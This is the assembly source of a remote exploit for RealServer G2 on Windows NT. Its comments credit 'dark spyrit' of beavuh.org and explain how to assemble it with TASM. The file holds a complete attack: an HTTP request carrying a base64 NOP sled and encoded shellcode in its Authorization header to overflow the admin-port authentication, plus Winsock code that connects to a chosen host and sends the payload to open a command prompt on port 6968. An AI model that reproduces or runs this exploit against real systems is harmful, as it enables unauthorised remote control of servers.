; The binary is available at http://www.beavuh.org.
;
; This exploits a buffer overflow in RealServers web authentication on
; the administrator port - hence the reason the shellcode is base64 encoded.
; This has been tested on the NT version with a default installation.
; If RealServer is installed in a different directory than the default, the
; buffer will need to be adjusted accordingly.
; The administrator port is randomly selected at installation, but as you'll
; only be testing on your own networks this won't matter :)
;
; To assemble:
;
; tasm32 -ml realown.asm
; tlink32 -Tpe -c -x realown.obj ,,, import32
;
; TASM 5 required!
;
; dark spyrit  <dspyrit@beavuh.org>


.386p
locals
jumps
.model flat, stdcall


extrn GetCommandLineA:PROC
extrn GetStdHandle:PROC
extrn WriteConsoleA:PROC
extrn ExitProcess:PROC
extrn WSAStartup:PROC
extrn connect:PROC
extrn send:PROC
extrn recv:PROC
extrn WSACleanup:PROC
extrn gethostbyname:PROC
extrn htons:PROC
extrn socket:PROC
extrn inet_addr:PROC
extrn closesocket:PROC


.data

sploit:

db "GET /admin/index.html HTTP/1.0",0dh,0ah
db "Connection: Keep-Alive",0dh,0ah
db "User-Agent: Mozilla/4.04 [en] (X11; I; Beavuh OS .9 i486; Nav)",0dh,0ah
db "Host: 111.111.11.1:1111",0dh,0ah
db "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",0dh,0ah
db "Accept-Language: en",0dh,0ah
db "Accept-Charset: iso-8859-1,*,utf-8",0dh,0ah
db "Authorization: Basic kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"
db "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"
db "JCQkJCQkJCQkJCQkJCQkJCQ6wiQkJBXRToAkJCQkJCQkJCQkJCQkJCQkIt0JPiL/jPAUPf"
db "QUFnyr1mxxovHSIAwmeL6M/aWu5mcQEbB6whW/xOL0PwzybELSTLArITAdflSUVZSs5T/E"
db "6tZWuLsMsCshMB1+bOcVv8Ti9D8M8mxBjLArITAdflSUVZSs5T/E6tZWuLsg8YFM8BQQFB"
db "AUP9X6JNqEFZT/1fsagJT/1fwM8BXULAMq1irQKtfSFBXVq1W/1fASFBXrVatVv9XwEiwR"
db "IkHV/9XxDPAi0b0iUc8iUdAiwaJRzgzwGa4AQGJRyxXVzPAUFBQQFBIUFCtVjPAUP9XyP9"
db "28P9XzP92/P9XzEhQUFP/V/SL2DPAtARQwegEUP9X1IvwM8CLyLUEUFBXUVD/d6j/V9CDP"
db "wF8IjPAUFf/N1b/d6j/V9wLwHQvM8BQ/zdWU/9X+GpQ/1fg68gzwFC0BFBWU/9X/FczyVF"
db "QVv93rP9X2GpQ/1fg66pQ/1fkkNLcy9fc1aqrmdrr/Pjt/Mnw6fyZ3vztyu346+3s6dD3/"
db "/bYmdrr/Pjt/Mnr9vr86urYmdr19ur80fj3/fX8mcn8/PLX+PT8/cnw6fyZ3vX2+/j12PX"
db "19vqZzuvw7fzf8PX8mcv8+P3f8PX8mcr1/Pzpmdzh8O3J6/b6/Orqmc7K1trSqquZ6vb68"
db "vztmfvw9/2Z9fDq7fz3mfj6+vzp7Znq/Pf9mev8+u+Zm5mCoZmZmZmZmZmZmZmZmfr0/bf"
db "84fyZ/////w==",0dh,0ah,0dh,0ah,0

sploit_length equ $-sploit

logo  db "RealServer G2 exploit [NT] - please check http://www.beavuh.org for info.", 13, 10
      db "by dark spyrit <dspyrit@beavuh.org>",13,10,13,10
      db "usage: realown <host> <admin_port>", 13, 10
      db "eg - realown host.com 6666",13,10
      db "the exploit will spawn a command prompt on port 6968",13,10,0
      logolen equ $-logo


errorinit db 10,"error initializing winsock.", 13, 10, 0
errorinitl equ $-errorinit

derror  db 10,"error.",13,10,0
derrorl equ $-derror

nohost db 10,"no host or ip specified.", 13,10,0
nohostl equ $-nohost

noport db 10,"no port specified.",13,10,0
noportl equ $-noport

reshost db 10,"error resolving host.",13,10,0
reshostl equ $-reshost

sockerr db 10,"error creating socket.",13,10,0
sockerrl equ $-sockerr

ipill   db 10,"ip error.",13,10,0
ipilll   equ $-ipill

cnerror db 10,"error establishing connection.",13,10,0
cnerrorl equ $-cnerror

success db 10,"sent.. spawn connection now.",13,10,0
successl equ $-success

console_in      dd      ?
console_out     dd      ?
bytes_read      dd      ?

wsadescription_len equ 256
wsasys_status_len equ 128

WSAdata struct
wVersion dw ?
wHighVersion dw ?
szDescription db wsadescription_len+1 dup (?)
szSystemStatus db wsasys_status_len+1 dup (?)
iMaxSockets dw ?
iMaxUdpDg dw ?
lpVendorInfo dw ?
WSAdata ends

sockaddr_in struct
sin_family dw ?
sin_port dw ?
sin_addr dd ?
sin_zero db 8 dup (0)
sockaddr_in ends

wsadata WSAdata <?>
sin sockaddr_in <?>
sock dd ?
numbase dd 10
_port db 256 dup (?)
_host db 256 dup (?)
_port2 db 256 dup (?)
buffer db 1000 dup (0)

.code
start:

        call    init_console
        push    logolen
        push    offset logo
        call    write_console

        call    GetCommandLineA
        mov     edi, eax
        mov     ecx, -1
        xor     al, al
        push    edi
        repnz   scasb
        not     ecx
        pop     edi
        mov     al, 20h
        repnz   scasb
        dec     ecx
        cmp     ch, 0ffh
        jz      @@0
        test    ecx, ecx
        jnz     @@1
@@0:        
        push    nohostl
        push    offset nohost
        call    write_console
        jmp     quit3
@@1:
        mov     esi, edi
        lea     edi, _host
        call    parse
        or      ecx, ecx
        jnz     @@2
        push    noportl
        push    offset noport
        call    write_console
        jmp     quit3
@@2:
        lea     edi, _port
        call    parse

        push    offset wsadata
        push    0101h
        call    WSAStartup
        or      eax, eax
        jz      winsock_found

        push    errorinitl
        push    offset errorinit
        call    write_console
        jmp     quit3

winsock_found:
        xor     eax, eax
        push    eax
        inc     eax
        push    eax
        inc     eax
        push    eax
        call    socket
        cmp     eax, -1
        jnz     socket_ok

        push    sockerrl
        push    offset sockerr
        call    write_console
        jmp     quit2

socket_ok:
        mov     sock, eax
        mov     sin.sin_family, 2
        
        mov     ebx, offset _port
        call    str2num
        mov     eax, edx
        push    eax
        call    htons
        mov     sin.sin_port, ax
        
        mov     esi, offset _host
lewp:
        xor     al, al
        lodsb
        cmp     al, 039h
        ja      gethost
        test    al, al
        jnz     lewp
        push    offset _host
        call    inet_addr
        cmp     eax, -1
        jnz     ip_aight
        push    ipilll
        push    offset ipill
        call    write_console
        jmp     quit1

ip_aight:
        mov     sin.sin_addr, eax
        jmp     continue

gethost:
        push    offset _host
        call    gethostbyname
        test    eax, eax
        jnz     gothost

        push    reshostl
        push    offset reshost
        call    write_console
        jmp     quit1

gothost:
        mov     eax, [eax+0ch]
        mov     eax, [eax]
        mov     eax, [eax]
        mov     sin.sin_addr, eax

continue:
        push    size sin
        push    offset sin
        push    sock
        call    connect
        or      eax, eax
        jz      connect_ok
        push    cnerrorl
        push    offset cnerror
        call    write_console
        jmp     quit1

connect_ok:
        
        xor     eax, eax
        push    eax
        push    sploit_length
        push    offset sploit
        push    sock
        call    send
        push    successl
        push    offset success
        call    write_console

quit1:
        push    sock
        call    closesocket
quit2:
        call    WSACleanup
quit3:
        push    0
        call    ExitProcess
parse   proc
;cheap parsing.. 
lewp9:
        xor     eax, eax
        cld
        lodsb
        cmp     al, 20h
        jz      done
        test    al, al
        jz      done2
        stosb
        dec     ecx
        jmp     lewp9
done:
        dec     ecx
done2:
        ret
endp

str2num proc
        push    eax ecx edi
        xor     eax, eax
        xor     ecx, ecx
        xor     edx, edx
        xor     edi, edi
lewp2:
        xor     al, al
        xlat
        test    al, al
        jz      end_it
        sub     al, 030h
        mov     cl, al
        mov     eax, edx
        mul     numbase
        add     eax, ecx
        mov     edx, eax
        inc     ebx
        inc     edi
        cmp     edi, 0ah
        jnz     lewp2

end_it:
        pop     edi ecx eax
        ret
endp

init_console  proc
        push    -10
        call    GetStdHandle
        or      eax, eax
        je      init_error
        mov     [console_in], eax
        push    -11
        call    GetStdHandle
        or      eax, eax
        je      init_error
        mov     [console_out], eax
        ret
init_error:
        push    0
        call    ExitProcess
endp

write_console proc    text_out:dword, text_len:dword
        pusha
        push    0
        push    offset bytes_read 
        push    text_len          
        push    text_out          
        push    console_out       
        call    WriteConsoleA
        popa
        ret
endp

end     start



